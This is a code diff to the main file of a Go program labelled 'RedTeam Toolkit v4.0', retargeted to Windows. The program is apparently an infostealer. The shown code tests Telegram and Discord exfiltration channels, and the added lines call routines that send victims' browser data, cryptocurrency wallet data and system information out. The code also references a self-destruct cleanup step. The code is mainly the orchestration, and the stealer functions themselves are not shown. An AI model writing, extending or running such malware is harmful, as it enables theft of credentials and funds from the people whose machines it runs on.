@@ -1,5 +1,5 @@
 // ============================================================
-// main.go - RedTeam Toolkit v4.0 (Go) - FULL VERSION
+// main.go - RedTeam Toolkit v4.0 (Windows) - COMPLETE
 // ============================================================
 package main
 
@@ -53,7 +53,7 @@ func main() {
 	
 	// Initialize logging
 	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
-	log.Println("🚀 RedTeam Toolkit v4.0 (Go) starting...")
+	log.Println("🚀 RedTeam Toolkit v4.0 (Windows) starting...")
 	log.Println("========================================")
 	
 	// Load configuration
@@ -73,7 +73,7 @@ func main() {
 	
 	// Test Telegram
 	log.Println("📤 Sending Telegram test message...")
-	if exfil.SendTelegram("✅ RedTeam Toolkit v4.0 (Go) is running!") {
+	if exfil.SendTelegram("✅ RedTeam Toolkit v4.0 (Windows) is running!") {
 		log.Println("✅ Telegram test message sent successfully!")
 	} else {
 		log.Println("❌ Telegram test message failed! Check your bot token and chat ID.")
@@ -87,7 +87,7 @@ func main() {
 
 	// Test Discord
 	log.Println("📤 Sending Discord test message...")
-	if exfil.SendDiscord("✅ RedTeam Toolkit v4.0 (Go) is running!") {
+	if exfil.SendDiscord("✅ RedTeam Toolkit v4.0 (Windows) is running!") {
 		log.Println("✅ Discord test message sent successfully!")
 	} else {
 		log.Println("❌ Discord test message failed!")
@@ -195,6 +195,18 @@ func main() {
 	log.Println("📤 Exfiltrating data...")
 	exfil.SendHeartbeat("📤 Collecting and exfiltrating data...")
 	exfil.CollectAndSend()
+
+	// Send browser data specifically
+	log.Println("📤 Sending browser data...")
+	exfil.SendBrowserData()
+
+	// Send wallet data
+	log.Println("📤 Sending wallet data...")
+	exfil.SendWalletData()
+
+	// Send system info
+	log.Println("📤 Sending system info...")
+	exfil.SendSystemInfo()
 
 	// Cleanup
 	if config.SelfDestruct {
